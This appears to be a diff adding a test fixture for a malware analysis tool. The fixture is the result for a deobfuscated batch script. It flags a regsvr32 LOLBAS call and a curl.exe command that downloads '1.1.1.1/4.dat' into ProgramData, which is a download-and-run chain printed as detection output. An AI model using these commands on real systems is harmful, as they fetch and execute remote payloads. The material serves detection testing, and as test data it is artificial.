@@ -1,0 +1,83 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 50,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[{\"LOLBAS\": \"regsvr32\", \"Command\": \"regsvr32 \\\"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\\\"\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 50,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Possible rare LOLBAS found",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"URL\": \"1.1.1.1/4.dat\", \"Destination\": \"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\", \"Command\": \"curl.exe -o C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos 1.1.1.1/4.dat\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "1.1.1.1"
+              ],
+              "uri": [
+                "1.1.1.1/4.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "External file download in batch script",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "055d0df054_deobfuscated.bat",
+        "sha256": "055d0df0541f05f7bd42eb0d4ebd4d8774718076085021912191e6b6660abd9d"
+      }
+    ],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "network.static.ip": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "1.1.1.1"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "1.1.1.1/4.dat"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
